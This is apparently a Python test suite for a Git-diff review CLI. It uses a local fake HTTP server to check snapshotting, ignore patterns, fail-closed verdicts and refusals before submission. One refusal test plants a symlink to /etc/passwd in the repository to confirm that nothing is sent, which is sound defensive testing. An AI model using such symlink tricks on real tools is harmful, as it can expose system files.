"""Public CLI proof with real Git and synthetic authenticated HTTP responses; no paid API."""
import hashlib
import http.server
import json
import os
from pathlib import Path
import shutil
import subprocess
import sys
import tempfile
import threading
import time
import unittest

HERE = Path(__file__).resolve().parent
PLUGIN = HERE.parent if (HERE.parent / 'tools').is_dir() else HERE.parent / 'plugins/agent-workflows'
CLI = PLUGIN / 'tools/kodus-review/kodus_review.py'
# The scope keys of a kodus-review-ignores/2 document with the central defaults.
DEFAULT_SCOPE = {'context_include':['AGENTS.md','CLAUDE.md'],'same_directory':True,'generated_markers':True,
                 'send_changed_content':True,'secret_add':[],'max_context_file_bytes':256*1024,
                 'snapshot_budget_bytes':32*1024*1024,'kodus_content_bytes':1024*1024}

class ReviewCLI(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.repo = self.root / 'repo'
        self.repo.mkdir()
        self.env = {k:v for k,v in os.environ.items() if not k.startswith(('GIT_', 'KODUS_'))}
        self.env.update(GIT_CONFIG_GLOBAL=os.devnull, GIT_CONFIG_NOSYSTEM='1',
                        GIT_AUTHOR_NAME='test', GIT_AUTHOR_EMAIL='test@example.com',
                        GIT_COMMITTER_NAME='test', GIT_COMMITTER_EMAIL='test@example.com')
        self.git('init', '-q')
        self.git('remote', 'add', 'origin', 'https://github.com/example/project.git')
        (self.repo/'a.py').write_text('value = 1\n')
        self.git('add', '--', 'a.py')
        self.git('-c', 'commit.gpgsign=false', 'commit', '-qm', 'base')
        self.base = self.git('rev-parse', 'HEAD').strip()
        self.brief = self.root/'intent.txt'; self.brief.write_text('Synthetic intent only\n')
        token = self.root/'token'; token.write_text('kodus_test_fixture')
        self.env.update(KODUS_REVIEW_CONTEXT='personal', KODUS_REVIEW_ALLOWED_REPOS='example/project',
                        KODUS_REVIEW_TOKEN_FILE=str(token), KODUS_REVIEW_DENIED_ROOTS=str(self.root/'backups'), KODUS_REVIEW_TIMEOUT='2',
                        KODUS_REVIEW_POLL_INTERVAL='0.01')
        # The launcher always pins an absolute Git; tests do the same.
        self.env['KODUS_REVIEW_GIT']=subprocess.check_output(['sh','-c','command -v git'],text=True).strip()
        self.calls=[]; self.response={'summary':'done','issues':[],'filesAnalyzed':1,'duration':1}
        self.http_status=200; self.job_status='COMPLETED'; self.mutate_on_poll=False; self.move_on_poll=False
        self.created_at=None; self.created_override=None
        self.get_failures=0; self.get_failure_status=502
        self.auto_count=True; self.posted_files=0
        owner=self
        class Handler(http.server.BaseHTTPRequestHandler):
            def log_message(self,*args): pass
            def do_POST(self):
                body=json.loads(self.rfile.read(int(self.headers['Content-Length'])))
                owner.calls.append((self.path,dict(self.headers),body))
                owner.posted_files=len(body.get('config',{}).get('files',[]))
                owner.created_at=owner.created_override or time.strftime('%Y-%m-%dT%H:%M:%S.123Z',time.gmtime())
                self.send_response(owner.http_status); self.end_headers()
                self.wfile.write(json.dumps({'data':{'jobId':'synthetic-job','status':'PENDING'}}).encode())
            def do_GET(self):
                if owner.move_on_poll:
                    owner.repo.rename(owner.root/'moved-repo')
                if owner.mutate_on_poll:
                    (owner.repo/'a.py').write_text('raced = True\n')
                owner.calls.append((self.path,dict(self.headers),None))
                if owner.get_failures:
                    owner.get_failures-=1
                    self.send_response(owner.get_failure_status); self.end_headers(); return
                if self.path!='/cli/review/jobs/synthetic-job':
                    self.send_response(404); self.end_headers(); return
                self.send_response(200); self.end_headers()
                result=dict(owner.response)
                if owner.auto_count:
                    # Like the service: filesAnalyzed is the number of config.files entries.
                    result['filesAnalyzed']=owner.posted_files
                self.wfile.write(json.dumps({'data':{'status':owner.job_status,'result':result,
                                                     'createdAt':owner.created_at}}).encode())
        self.server=http.server.ThreadingHTTPServer(('127.0.0.1',0),Handler)
        thread=threading.Thread(target=self.server.serve_forever,daemon=True);thread.start()
        self.addCleanup(self.server.server_close);self.addCleanup(self.server.shutdown)
        self.env['KODUS_REVIEW_API_URL']=f'http://127.0.0.1:{self.server.server_port}'
        # Every run binds a rendered ignores document; the default exercises the exclude
        # pathspecs without matching any path the older tests change.
        self.ignores=self.write_ignores(['**/*.lock'])

    def write_ignores(self,patterns,raw=None,**changes):
        document={'schema':'kodus-review-ignores/2','source':'example/policy','commit':'a'*40,
                  'repository':'example/project','patterns':patterns,**DEFAULT_SCOPE,**changes}
        path=self.root/('ignores-'+str(len(list(self.root.glob('ignores-*.json'))))+'.json')
        path.write_bytes(raw if raw is not None else (json.dumps(document,indent=2,ensure_ascii=False)+'\n').encode())
        return path

    def git(self,*args):
        return subprocess.check_output(['git','-C',str(self.repo),*args],env=self.env,text=True,stderr=subprocess.PIPE)

    def write_renderer(self,output,code=0,sleep=0):
        """A launcher-style renderer: logs its argv, prints the given bytes, exits with code."""
        n=len(list(self.root.glob('renderer-*')))
        body=self.root/('render-body-'+str(n));body.write_bytes(output)
        log=self.root/('render-argv-'+str(n))
        script=self.root/('renderer-'+str(n))
        script.write_text('#!/bin/sh\nprintf "%s\\n" "$@" > '+str(log)+'\n'
                          +('sleep '+str(sleep)+'\n' if sleep else '')
                          +'cat '+str(body)+'\nexit '+str(code)+'\n')
        script.chmod(0o755)
        return script,log

    def run_review(self,changes=None,*args,patched=None,raises=None):
        env={**self.env,**(changes or {})}
        out=self.root/('review-'+str(len(list(self.root.glob('review-*.json'))))+'.json')
        ignores=['--ignores',str(self.ignores)] if self.ignores else []
        # Constants and failures are patched in-process; the CLI otherwise runs unmodified.
        launcher=[str(CLI)] if patched is None and raises is None else ['-c',
            'import importlib.util,json,sys\n'
            'spec=importlib.util.spec_from_file_location("kodus_review_under_test",sys.argv[1])\n'
            'm=importlib.util.module_from_spec(spec);spec.loader.exec_module(m)\n'
            'for k,v in json.loads(sys.argv[2]).items(): setattr(m,k,v)\n'
            'for k,v in json.loads(sys.argv[3]).items():\n'
            '    def boom(*a,_e=v,**kw): raise {"MemoryError":MemoryError,"OSError":OSError,"KeyError":KeyError}[_e]()\n'
            '    setattr(m,k,boom)\n'
            'sys.argv=["kodus_review"]+sys.argv[4:];sys.exit(m.main())',
            str(CLI),json.dumps(patched or {}),json.dumps(raises or {})]
        run=subprocess.run([sys.executable,*launcher,'--repo',str(self.repo),'--base',self.base,
                            '--brief',str(self.brief),'--out',str(out),*ignores,*args],env=env,
                           capture_output=True,text=True,timeout=60)
        return run, json.loads(out.read_text()) if out.exists() else None

    def test_final_snapshot_includes_untracked_and_unstaged_without_touching_index(self):
        (self.repo/'a.py').write_text('value = 2\n');self.git('add','--','a.py')
        (self.repo/'a.py').write_text('value = 3\n')
        (self.repo/'new.py').write_text('new = True\n')
        self.response['filesAnalyzed']=2
        before=(self.repo/'.git/index').read_bytes()
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual((self.repo/'.git/index').read_bytes(),before)
        snapshot=Path(e['candidate']['snapshot_path'])
        self.assertEqual((snapshot/'a.py').read_text(),'value = 3\n')
        self.assertEqual((snapshot/'new.py').read_text(),'new = True\n')
        self.assertTrue(e['local_review_required']);self.assertEqual(e['overall_verdict'],'PENDING')
        self.assertEqual(e['kodus']['context'],'partial-or-unknown')
        self.assertIn('new.py', self.calls[0][2]['diff'])
        self.assertNotIn('focus',self.calls[0][2].get('config',{}))
        self.assertTrue(all(c[1].get('X-Team-Key')=='kodus_test_fixture' for c in self.calls))
        self.assertNotIn('kodus_test_fixture',json.dumps(e))
        self.assertEqual(Path(e['evidence_path']).stat().st_mode & 0o777,0o400)

    def test_space_paths_and_renames_keep_exact_candidate_and_index(self):
        folder=self.repo/'backlog/tasks';folder.mkdir(parents=True)
        for name in ('modify task.md','delete task.md','rename old.md'):
            (folder/name).write_text('original\n')
        self.git('add','--','backlog')
        self.git('-c','commit.gpgsign=false','commit','-qm','space names')
        self.base=self.git('rev-parse','HEAD').strip()
        (folder/'modify task.md').write_text('staged\n')
        self.git('add','--','backlog/tasks/modify task.md')
        (folder/'modify task.md').write_text('final\n')
        (folder/'delete task.md').unlink()
        (folder/'rename old.md').rename(folder/'rename new.md')
        (folder/'add task.md').write_text('added\n')
        # Host preferences must not alter parser prefixes or collapse a rename pair.
        self.git('config','diff.renames','true');self.git('config','diff.noprefix','true')
        self.git('config','color.diff','always');self.git('config','diff.relative','true')
        before=(self.repo/'.git/index').read_bytes()
        self.response['filesAnalyzed']=5
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual((self.repo/'.git/index').read_bytes(),before)
        candidate=e['candidate']
        expected=['backlog/tasks/'+n for n in ('add task.md','delete task.md','modify task.md','rename new.md','rename old.md')]
        self.assertEqual(candidate['changed_paths'],expected)
        self.assertEqual(candidate['base'],self.base)
        patch=Path(candidate['patch_path']).read_bytes()
        self.assertEqual(hashlib.sha256(patch).hexdigest(),candidate['patch_sha256'])
        self.assertEqual(patch.decode(),self.calls[0][2]['diff'])
        self.assertEqual(patch.decode().count('diff --git '),5)
        self.assertNotIn(b'\x1b[',patch)
        files=self.sent_files(0)
        self.assertEqual([f['path'] for f in files],expected)
        self.assertEqual(''.join(f['diff'] for f in files),patch.decode())
        self.assertTrue(all('\x1b[' not in f['diff'] for f in files))
        self.assertNotIn('rename from',patch.decode())
        snapshot=Path(candidate['snapshot_path'])
        self.assertEqual((snapshot/'backlog/tasks/modify task.md').read_text(),'final\n')
        self.assertEqual((Path(candidate['base_snapshot_path'])/'backlog/tasks/modify task.md').read_text(),'original\n')
        self.assertFalse((snapshot/'backlog/tasks/rename old.md').exists())
        # Reconstruct the final tree independently using a separate real Git index.
        env={**self.env,'GIT_INDEX_FILE':str(self.root/'expected-index')}
        for args in [('read-tree',self.base),('add','--all','--','.'),('write-tree',)]:
            result=subprocess.check_output(['git','-C',str(self.repo),*args],env=env,text=True)
        self.assertEqual(candidate['tree'],result.strip())

    def test_ambiguous_changed_paths_are_refused_without_submission(self):
        for name in ('trailing ', ' leading.md', 'a b/name.md', 'diff --git.md',
                     'quote".md', 'tab\t.md', 'unicode-é.md', 'back\\slash.md'):
            with self.subTest(name=name):
                path=self.repo/name;path.parent.mkdir(parents=True,exist_ok=True)
                path.write_text('unsupported\n')
                before=(self.repo/'.git/index').read_bytes()
                run,e=self.run_review()
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertEqual(self.calls,[])
                self.assertEqual((self.repo/'.git/index').read_bytes(),before)
                path.unlink()

    def test_explicit_staged_ignored_file_is_included_without_ignored_untracked_siblings(self):
        (self.repo/'.gitignore').write_text('codex/\n')
        self.git('add','--','.gitignore');self.git('-c','commit.gpgsign=false','commit','-qm','ignore')
        self.base=self.git('rev-parse','HEAD').strip()
        folder=self.repo/'policy/codex';folder.mkdir(parents=True)
        included=folder/'review.md';included.write_text('staged review rule\n')
        self.git('add','--force','--','policy/codex/review.md')
        included.write_text('final review rule\n')
        (folder/'private.txt').write_text('ignored untracked must not escape\n')
        before=(self.repo/'.git/index').read_bytes()
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual((self.repo/'.git/index').read_bytes(),before)
        snapshot=Path(e['candidate']['snapshot_path'])
        self.assertEqual((snapshot/'policy/codex/review.md').read_text(),'final review rule\n')
        self.assertFalse((snapshot/'policy/codex/private.txt').exists())
        self.assertEqual(e['candidate']['changed_paths'],['policy/codex/review.md'])
        self.assertNotIn('ignored untracked must not escape',self.calls[0][2]['diff'])

    def test_tracked_file_replaced_by_directory_cannot_force_add_ignored_children(self):
        (self.repo/'.gitignore').write_text('a.py/**\n')
        self.git('add','--','.gitignore');self.git('-c','commit.gpgsign=false','commit','-qm','ignore children')
        self.base=self.git('rev-parse','HEAD').strip()
        (self.repo/'a.py').rename(self.root/'retained-base.py')
        (self.repo/'a.py').mkdir()
        (self.repo/'a.py/private.txt').write_text('ignored contents must not be submitted\n')
        before=(self.repo/'.git/index').read_bytes()
        run,e=self.run_review()
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(self.calls,[])
        self.assertEqual((self.repo/'.git/index').read_bytes(),before)

    def test_file_directory_replacements_keep_exact_per_file_patches(self):
        parent=self.repo/'foo'
        parent.write_text('diff --git a/literal b/literal\nfile payload\n')
        self.git('add','--','foo');self.git('-c','commit.gpgsign=false','commit','-qm','file')
        file_head=self.git('rev-parse','HEAD').strip()
        parent.rename(self.root/'retained-file')
        parent.mkdir();(parent/'bar').write_text('diff --git a/other b/other\nchild payload\n')
        self.git('add','--all','--','foo');self.git('-c','commit.gpgsign=false','commit','-qm','directory')
        directory_head=self.git('rev-parse','HEAD').strip()
        self.response['filesAnalyzed']=2
        for label,base,head in [('file-to-directory',file_head,directory_head),
                                ('directory-to-file',directory_head,file_head),
                                ('working-directory-to-file',directory_head,None)]:
            with self.subTest(direction=label):
                if head is None:
                    (parent/'bar').rename(self.root/'retained-child');parent.rmdir()
                    parent.write_text('diff --git a/final b/final\nfinal payload\n')
                self.base=base;before=(self.repo/'.git/index').read_bytes();call_index=len(self.calls)
                run,e=self.run_review({},*(['--head',head] if head else []))
                self.assertEqual(run.returncode,0,run.stderr)
                self.assertEqual((self.repo/'.git/index').read_bytes(),before)
                files=self.sent_files(call_index)
                self.assertEqual([f['path'] for f in files],['foo','foo/bar'])
                self.assertEqual([f['status'] for f in files],
                                 ['deleted','added'] if label=='file-to-directory' else ['added','deleted'])
                self.assertEqual(''.join(f['diff'] for f in files),self.calls[call_index][2]['diff'])
                self.assertEqual(files[0]['diff'].splitlines()[0],'diff --git a/foo b/foo')
                self.assertEqual(files[1]['diff'].splitlines()[0],'diff --git a/foo/bar b/foo/bar')
                self.assertNotIn('diff --git a/foo/bar b/foo/bar',files[0]['diff'])
                self.assertIn('diff --git a/',files[0]['diff'].split('@@')[-1])
                self.assertIn('diff --git a/',files[1]['diff'].split('@@')[-1])
                self.assertEqual(e['candidate']['base'],base)
                if head:
                    self.assertEqual(e['candidate']['tree'],self.git('rev-parse',head+'^{tree}').strip())

    def test_structured_files_preserve_literal_diff_markers_and_full_patch(self):
        (self.repo/'a.py').write_text('before\ndiff --git quoted documentation\nafter\n')
        self.git('add','--','a.py');self.git('-c','commit.gpgsign=false','commit','-qm','markers')
        self.base=self.git('rev-parse','HEAD').strip()
        (self.repo/'a.py').write_text('changed\ndiff --git quoted documentation\nafter\nmore diff --git literal\n')
        (self.repo/'new task.md').write_text('new diff --git literal\nlast line\n')
        self.response['filesAnalyzed']=2
        before=(self.repo/'.git/index').read_bytes()
        run,e=self.run_review();self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual((self.repo/'.git/index').read_bytes(),before)
        body=self.calls[0][2];files=body['config'].get('files')
        self.assertIsInstance(files,list)
        self.assertEqual([f['path'] for f in files],['a.py','new task.md'])
        self.assertEqual([f['status'] for f in files],['modified','added'])
        self.assertEqual([f['content'] for f in files],[(self.repo/f['path']).read_text() for f in files])
        self.assertEqual(''.join(f['diff'] for f in files),body['diff'])
        for f in files:
            expected=self.git('--literal-pathspecs','diff','--no-ext-diff','--no-textconv','--binary','--full-index',
                              '--no-renames','--src-prefix=a/','--dst-prefix=b/','--line-prefix=',
                              self.base,e['candidate']['tree'],'--',f['path'])
            self.assertEqual(f['diff'],expected)
        stored=Path(e['candidate']['files_path']).read_bytes()
        self.assertEqual(json.loads(stored),files)
        self.assertEqual(hashlib.sha256(stored).hexdigest(),e['candidate']['files_sha256'])

    def test_textual_binary_header_literals_are_not_binary_patches(self):
        path=self.repo/'a.py'
        path.write_text('GIT binary patch\nBinary files old and new differ\nold text\n')
        self.git('add','--','a.py')
        self.git('-c','commit.gpgsign=false','commit','-qm','textual markers')
        self.base=self.git('rev-parse','HEAD').strip()
        path.write_text('GIT binary patch\nnew text\nBinary files a and b differ\n')
        before=(self.repo/'.git/index').read_bytes()
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual((self.repo/'.git/index').read_bytes(),before)
        patch=self.calls[0][2]['diff']
        self.assertIn(' GIT binary patch\n',patch)
        self.assertIn('-Binary files old and new differ\n',patch)
        self.assertIn('+Binary files a and b differ\n',patch)
        self.assertEqual(Path(e['candidate']['patch_path']).read_text(),patch)
        self.assertEqual(hashlib.sha256(patch.encode()).hexdigest(),e['candidate']['patch_sha256'])

    def test_unchanged_binary_context_is_retained_and_binary_only_change_has_no_verdict(self):
        binary=b'\x89PNG\x00\xfffixture'
        (self.repo/'image.png').write_bytes(binary)
        self.git('add','--','image.png');self.git('-c','commit.gpgsign=false','commit','-qm','asset')
        self.base=self.git('rev-parse','HEAD').strip()
        (self.repo/'a.py').write_text('value = 7\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual((Path(e['candidate']['snapshot_path'])/'image.png').read_bytes(),binary)
        self.assertEqual((Path(e['candidate']['base_snapshot_path'])/'image.png').read_bytes(),binary)
        calls=len(self.calls);(self.repo/'a.py').write_text('value = 1\n')
        (self.repo/'image.png').write_bytes(binary+b'changed')
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.assertIn('No reviewable text changes',e['kodus']['error'])
        self.assertEqual(len(self.calls),calls)

    def test_staged_deletion_is_preserved_in_final_candidate(self):
        self.response['filesAnalyzed']=2
        self.git('rm', '--', 'a.py')
        (self.repo/'new.py').write_text('replacement = 1\n')
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertFalse((Path(e['candidate']['snapshot_path'])/'a.py').exists())
        self.assertIn('deleted file mode',self.calls[0][2]['diff'])

    def test_untracked_only_and_high_severity_are_not_clean_no_changes(self):
        (self.repo/'only.py').write_text('bad = True\n')
        self.response['issues']=[{'file':'only.py','line':1,'severity':'high','message':'synthetic'}]
        run,e=self.run_review()
        self.assertEqual(run.returncode,1,run.stderr);self.assertEqual(e['kodus']['verdict'],'FAIL')
        self.assertEqual(e['overall_verdict'],'FAIL')

    def test_auth_failure_unknown_severity_and_incomplete_job_fail_closed(self):
        (self.repo/'a.py').write_text('value = 9\n')
        self.http_status=401
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(len(self.calls),1);self.assertNotIn('trial',self.calls[0][0])
        self.http_status=200;self.response['issues']=[{'severity':'novel'}]
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(e['kodus']['verdict'],'NO_VERDICT')
        self.assertEqual(e['kodus']['result']['issues'],[{'severity':'novel'}])
        self.response['issues']=[{'severity':'low'}]
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.response['issues']=[];self.job_status='FAILED'
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)

    def test_missing_file_count_timeout_and_candidate_race_have_no_verdict(self):
        (self.repo/'a.py').write_text('value = 8\n')
        self.auto_count=False;self.response['filesAnalyzed']=0
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.response['filesAnalyzed']=1;self.job_status='PROCESSING'
        run,e=self.run_review({'KODUS_REVIEW_TIMEOUT':'0.15'})
        self.assertEqual(run.returncode,2,run.stderr)
        self.job_status='COMPLETED';self.mutate_on_poll=True
        run,e=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(e['kodus']['verdict'],'NO_VERDICT')

    def test_post_result_git_failure_cannot_leave_component_pass(self):
        (self.repo/'a.py').write_text('value = 8\n')
        self.move_on_poll=True
        run,e=self.run_review()
        self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(e['kodus']['verdict'],'NO_VERDICT')
        self.assertIn('result',e['kodus'])

    def test_scope_context_and_symlink_refusals_send_nothing(self):
        (self.repo/'a.py').write_text('value = 8\n')
        for changes in ({'KODUS_REVIEW_CONTEXT':'work'}, {'KODUS_REVIEW_ALLOWED_REPOS':''},
                        {'KODUS_REVIEW_DENIED_ROOTS':''}, {'KODUS_REVIEW_DENIED_ROOTS':str(self.repo)}):
            run,_=self.run_review(changes);self.assertEqual(run.returncode,2,run.stderr)
        (self.repo/'link').symlink_to('/etc/passwd')
        run,_=self.run_review();self.assertEqual(run.returncode,2,run.stderr)
        self.assertEqual(self.calls,[])

    def test_committed_head_ignores_live_worktree_and_refuses_reused_output(self):
        (self.repo/'a.py').write_text('value = 4\n');self.git('add','--','a.py')
        self.git('-c','commit.gpgsign=false','commit','-qm','candidate')
        head=self.git('rev-parse','HEAD').strip();(self.repo/'a.py').write_text('value = 999\n')
        run,e=self.run_review(None,'--head',head)
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual((Path(e['candidate']['snapshot_path'])/'a.py').read_text(),'value = 4\n')
        self.assertEqual(e['candidate']['head'],head)
        self.assertEqual((Path(e['candidate']['base_snapshot_path'])/'a.py').read_text(),'value = 1\n')
        before=Path(e['evidence_path']).read_bytes(); calls=len(self.calls)
        repeat=subprocess.run([sys.executable,str(CLI),'--repo',str(self.repo),'--brief',str(self.brief),
                               '--ignores',str(self.ignores),'--out',e['evidence_path']],env=self.env,capture_output=True,timeout=8)
        self.assertEqual(repeat.returncode,2)
        self.assertEqual(Path(e['evidence_path']).read_bytes(),before)
        self.assertEqual(len(self.calls),calls)

    def commit(self,message,*paths):
        self.git('add','--',*paths);self.git('-c','commit.gpgsign=false','commit','-qm',message)
        self.base=self.git('rev-parse','HEAD').strip()

    def scope_record(self,e):
        return json.loads(Path(e['candidate']['scope_path']).read_text())

    def write(self,name,data):
        path=self.repo/name;path.parent.mkdir(parents=True,exist_ok=True)
        path.write_bytes(data) if isinstance(data,bytes) else path.write_text(data)
        return path

    def commit_all(self,message):
        self.git('add','--all','--','.');self.git('-c','commit.gpgsign=false','commit','-qm',message)
        self.base=self.git('rev-parse','HEAD').strip()

    def kodus_paths(self,call=0):
        return [f['path'] for f in self.sent_files(call)]

    def sent_files(self,call=0):
        """config.files entries carrying real diffs (withheld-path notices filtered out)."""
        return [f for f in self.calls[call][2]['config']['files']
                if not f['diff'].split('\n')[1][1:].startswith('[kodus-review:')]

    def test_ignored_large_recording_is_retained_locally_but_not_sent_or_refused(self):
        folder=self.repo/'testdata/replay';folder.mkdir(parents=True)
        recording=folder/'history.json'
        recording.write_text(''.join('{"event": %d, "payload": "%s"}\n' % (i,'x'*60) for i in range(40000)))
        self.assertGreater(recording.stat().st_size,1500000)
        (self.repo/'a.py').write_text('value = 2\n')
        self.ignores=self.write_ignores(['**/*.lock','testdata/replay/**'])
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        candidate=e['candidate']
        self.assertEqual(self.kodus_paths(),['a.py'])
        self.assertEqual(candidate['changed_paths'],['a.py','testdata/replay/history.json'])
        self.assertEqual(candidate['submitted_paths'],['a.py'])
        self.assertEqual(candidate['ignored_paths'],['testdata/replay/history.json'])
        full=Path(candidate['patch_path']).read_bytes()
        sent=Path(candidate['submitted_patch_path']).read_bytes()
        self.assertEqual(Path(candidate['patch_path']).name,'candidate.patch')
        self.assertEqual(Path(candidate['submitted_patch_path']).name,'submitted.patch')
        self.assertEqual(hashlib.sha256(full).hexdigest(),candidate['patch_sha256'])
        self.assertEqual(hashlib.sha256(sent).hexdigest(),candidate['submitted_patch_sha256'])
        self.assertIn(b'diff --git a/testdata/replay/history.json b/testdata/replay/history.json',full)
        self.assertNotIn(b'history.json',sent)
        self.assertEqual(sent.decode(),self.calls[0][2]['diff'])
        self.assertEqual(''.join(f['diff'] for f in self.sent_files(0)),sent.decode())
        # Kodus learns the ignored path exists (a notice), never its content.
        self.assertNotIn('"payload"',json.dumps(self.calls[0][2]))
        self.assertEqual(self.calls[0][2]['config']['files'][-1]['path'],'testdata/replay/history.json')
        self.assertEqual((Path(candidate['snapshot_path'])/'testdata/replay/history.json').read_bytes(),
                         recording.read_bytes())
        stored=Path(candidate['ignores_path'])
        self.assertEqual(stored.name,'ignores.json')
        self.assertEqual(stored.read_bytes(),self.ignores.read_bytes())
        self.assertEqual(stored.stat().st_mode & 0o777,0o444)
        self.assertEqual(candidate['ignores_sha256'],hashlib.sha256(self.ignores.read_bytes()).hexdigest())
        self.assertEqual(candidate['ignores_commit'],'a'*40)
        self.assertEqual(e['kodus']['verdict'],'PASS')

    def test_ignored_binary_change_is_kept_in_full_patch_without_refusal(self):
        binary=b'\x89PNG\x00\xfffixture'
        (self.repo/'docs').mkdir();(self.repo/'docs/image.png').write_bytes(binary)
        self.commit('asset','docs/image.png')
        (self.repo/'docs/image.png').write_bytes(binary+b'\x00changed')
        (self.repo/'a.py').write_text('value = 3\n')
        self.ignores=self.write_ignores(['**/*.png'])
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        candidate=e['candidate']
        self.assertEqual(self.kodus_paths(),['a.py'])
        self.assertEqual(candidate['ignored_paths'],['docs/image.png'])
        full=Path(candidate['patch_path']).read_bytes()
        self.assertIn(b'GIT binary patch',full)
        self.assertNotIn('image.png',self.calls[0][2]['diff'])
        self.assertTrue(candidate['candidate_patch_has_binary'])
        self.assertEqual((Path(candidate['snapshot_path'])/'docs/image.png').read_bytes(),binary+b'\x00changed')
        self.assertEqual((Path(candidate['base_snapshot_path'])/'docs/image.png').read_bytes(),binary)

    def test_all_changed_paths_ignored_is_skipped_without_network_or_token(self):
        (self.repo/'yarn.lock').write_text('generated\n')
        renderer,_=self.write_renderer(self.ignores.read_bytes())
        run,e=self.run_review({'KODUS_REVIEW_TOKEN_FILE':str(self.root/'absent-token'),
                               'KODUS_REVIEW_IGNORES_RENDERER':str(renderer)})
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual(self.calls,[])
        self.assertEqual(e['kodus']['verdict'],'SKIPPED')
        self.assertEqual(e['kodus']['skip_reason'],'all-changed-paths-ignored')
        self.assertEqual(e['overall_verdict'],'PENDING');self.assertTrue(e['local_review_required'])
        candidate=e['candidate']
        self.assertEqual(candidate['submitted_paths'],[]);self.assertEqual(candidate['ignored_paths'],['yarn.lock'])
        self.assertEqual(Path(candidate['submitted_patch_path']).read_bytes(),b'')
        self.assertEqual(json.loads(Path(candidate['files_path']).read_bytes()),[])
        self.assertIn(b'yarn.lock',Path(candidate['patch_path']).read_bytes())
        self.assertEqual((Path(candidate['snapshot_path'])/'yarn.lock').read_text(),'generated\n')
        self.assertIn('SKIPPED',run.stdout)
        self.assertTrue(candidate['ignores_renderer_verified'])

    def test_invalid_or_missing_ignores_refuse_before_submission(self):
        (self.repo/'a.py').write_text('value = 4\n')
        cases={'missing':None,
               'relative':Path('relative-ignores.json'),
               'repository':self.write_ignores([],repository='example/other'),
               'schema':self.write_ignores([],schema='kodus-review-ignores/1'),
               'commit':self.write_ignores([],commit='abc123'),
               'uppercase-commit':self.write_ignores([],commit='A'*40),
               'extra-key':self.write_ignores([],extra=True),
               'missing-key':self.write_ignores([],raw=json.dumps({'schema':'kodus-review-ignores/1',
                    'source':'example/policy','commit':'a'*40,'repository':'example/project'}).encode()),
               'duplicate-key':self.write_ignores([],raw=(
                    '{"schema":"kodus-review-ignores/1","source":"example/policy","commit":"'+'a'*40+
                    '","repository":"example/project","patterns":[],"patterns":["**"]}').encode()),
               'not-json':self.write_ignores([],raw=b'{not json'),
               'patterns-not-list':self.write_ignores('**/*.lock'),
               'too-many':self.write_ignores(['p%d/**' % i for i in range(501)])}
        for label,pattern in [('negation','!keep.py'),('absolute','/a.py'),('parent','x/../a.py'),
                              ('backslash','a\\b'),('control','a\tb'),('nul','a\x00b'),('del','a\x7fb'),
                              ('leading-space',' a.py'),('trailing-space','a.py '),('empty',''),
                              ('long','x'*201),('number',7)]:
            cases[label]=self.write_ignores([pattern])
        for label,path in cases.items():
            with self.subTest(case=label):
                self.ignores=path
                run,e=self.run_review()
                self.assertEqual(run.returncode,2,run.stderr)
                self.assertEqual(self.calls,[])
                self.assertEqual(e['kodus']['verdict'],'NO_VERDICT')
                if label=='missing':
                    self.assertIn('--ignores is required',e['kodus']['error'])
        self.ignores=self.write_ignores(['x'*200],repository='Example/Project')
        run,e=self.run_review();self.assertEqual(run.returncode,0,run.stderr)

    def test_glob_semantics_spaces_root_double_star_and_single_star(self):
        for name in ('yarn.lock','pkg/deep/go.lock','top.gen.go','pkg/inner.gen.go',
                     'docs/generated notes/page.md','docs/notes.md'):
            path=self.repo/name;path.parent.mkdir(parents=True,exist_ok=True);path.write_text(name+'\n')
        self.ignores=self.write_ignores(['**/*.lock','*.gen.go','docs/generated notes/**'])
        self.response['filesAnalyzed']=2
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        self.assertEqual(e['candidate']['submitted_paths'],['docs/notes.md','pkg/inner.gen.go'])
        self.assertEqual(self.kodus_paths(),['docs/notes.md','pkg/inner.gen.go'])
        self.assertEqual(e['candidate']['ignored_paths'],
                         ['docs/generated notes/page.md','pkg/deep/go.lock','top.gen.go','yarn.lock'])

    def test_snapshots_omit_unchanged_ignored_files_but_keep_changed_ignored_files(self):
        lib=self.repo/'vendor/lib';lib.mkdir(parents=True)
        (lib/'changed.js').write_text('old\n');(lib/'same.js').write_text('unchanged vendored\n')
        (lib/'link').symlink_to('same.js')
        self.commit('vendor','vendor')
        (lib/'changed.js').write_text('new\n');(self.repo/'a.py').write_text('value = 5\n')
        self.ignores=self.write_ignores(['**/vendor/**'])
        run,e=self.run_review()
        self.assertEqual(run.returncode,0,run.stderr)
        candidate=e['candidate']
        self.assertEqual(candidate['ignored_paths'],['vendor/lib/changed.js'])
        for key,content in (('snapshot','new\n'),('base_snapshot','old\n')):
            snapshot=Path(candidate[key+'_path'])
            self.assertEqual((snapshot/'vendor/lib/changed.js').read_text(),content)
            self.assertFalse((snapshot/'vendor/lib/same.js').exists())
            self.assertFalse(os.path.lexists(snapshot/'vendor/lib/link'))
            self.assertTrue((snapshot/'a.py').exists())
